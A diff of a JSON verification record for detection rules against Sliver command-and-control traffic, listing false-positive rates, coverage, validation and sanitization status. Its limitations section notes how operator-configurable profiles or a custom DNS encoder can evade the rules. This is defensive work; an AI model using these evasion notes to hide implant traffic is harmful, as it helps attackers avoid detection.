+      {"rule": "network_zeek_tls13_no_sni_no_visible_cert.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": null, "detection_hit": null, "fp_likelihood": "high", "recommended_role": "hunt", "recommended_level": "low"},
+      {"rule": "proc_creation_lnx_hidden_executable_var_tmp.yml", "harness_verdict": "not-testable-on-evtx", "fp_count": null, "fp_share_of_category_percent": null, "category_denominator": 23695, "detection_hit": null, "fp_likelihood": "high", "recommended_role": "hunt", "recommended_level": "low"},
+      {"rule": "proc_creation_untrusted_parent_spawns_shell.yml", "harness_verdict": "pass", "fp_count": 321, "fp_share_of_category_percent": 1.354716, "category_denominator": 23695, "detection_hit": true, "fp_likelihood": "high", "recommended_role": "hunt", "recommended_level": "low"},
+      {"rule": "proc_creation_unversioned_executable_from_script_host.yml", "harness_verdict": "pass", "fp_count": 3, "fp_share_of_category_percent": 0.012661, "category_denominator": 23695, "detection_hit": true, "fp_likelihood": "medium", "recommended_role": "hunt", "recommended_level": "medium"}
+    ],
+    "scenario_coverage": {
+      "verified_grounded_use_cases": 6,
+      "grounded_denominator": 10,
+      "coverage_percent": 60,
+      "floor_percent": 60,
+      "verdict": "expand",
+      "merge_effect": "above the floor; remaining additions are non-blocking future scenarios"
+    },
+    "history": [
+      {"iteration": 1, "measured_commit": "6ad937e88eb453ef3109d069668e0c7202861c94", "decision": "BLOCKED", "blockers": 4},
+      {"iteration": 2, "measured_commit": "8a4cad0a352b46299fe809f654638a13fa79ffc1", "decision": "PASS", "blockers": 0}
+    ]
+  },
   "detection_limitations": [
     "Generated names, hashes, ports, transport profiles, and TLS stacks are operator- or version-dependent; no rule hardcodes the lab address or port.",
-    "JA3/JA3S can overlap with other Go software and can change across Sliver/Go versions; use the pair plus periodicity and endpoint context.",
-    "Single-event Sigma cannot express the observed 10+0–3 second flow periodicity; an analytics layer must aggregate by endpoint pair and fingerprint.",
-    "TLS 1.3 mTLS exposed no passive certificate chain/x509 row in this trace, and JARM was all-zero because generic probes could not authenticate.",
-    "The broad no-SNI/no-visible-cert Zeek rule is intentionally a low-level hunt and requires aggregation/tuning."
+    "JA3/JA3S can overlap with other Go software and can change across Sliver/Go versions; HTTPS and mTLS were identical here, so use flow shape, periodicity, and endpoint context rather than claiming transport discrimination.",
+    "Single-event Sigma cannot express the observed 10+0–3 second flow or DNS-burst periodicity; an analytics layer must aggregate by endpoint pair/profile or by DNS source and terminal parent domain.",
+    "The clear HTTP User-Agent and URI profile are operator-configurable; HTTPS encrypted those request fields and therefore could not be evaluated against the HTTP-profile rules.",
+    "TLS 1.3 HTTPS and mTLS exposed no passive certificate chain/x509 row in these Linux traces, and both active JARM measurements were all-zero.",
+    "Linux endpoint and Zeek/Suricata rules are not testable on the Windows EVTX corpora; precision is classified qualitatively from run-local positive evidence and production false-positive reasoning.",
+    "The broad no-SNI/no-visible-cert Zeek rule is intentionally a low-level hunt and requires aggregation/tuning.",
+    "The DNS rules identify an observed restricted-alphabet multi-label encoding rather than Sliver exclusively; legitimate DNS tunnels can match, and a custom encoder can evade them."
   ],
   "sanitization": {
     "raw_evtx_committed": false,
@@ -415,11 +794,12 @@
     "certificates_or_private_keys_committed": false,
     "tokens_cookies_or_secrets_committed": false,
     "host_file_contents_committed": false,
-    "notes": "Only detection-relevant endpoint fields, TLS fingerprints, JARM result, NSM versions, alert summaries, and aggregate flow metadata are committed."
+    "notes": "Only detection-relevant endpoint fields, TLS fingerprints, JARM result, HTTP/DNS profile fields, NSM versions, alert summaries, hashes, and aggregate flow metadata are committed."
   },
   "validation": {
-    "pysigma": "All six Sigma rules parsed successfully with pySigma 1.5.0 on 2026-08-09.",
-    "json": "verification.json and both sanitized evidence JSON files passed jq validation on 2026-08-09."
+    "pysigma": "All twelve Sigma rules passed sigma-cli 3.1.0 checks with zero errors, condition errors, or issues on 2026-08-10.",
+    "json": "verification.json and all sanitized evidence and safety JSON files passed jq validation on 2026-08-10.",
+    "scenario_scope": "check-scenario-scope.py returned PASS on 2026-08-10."
   },
   "cleanup": {
     "status": "confirmed",
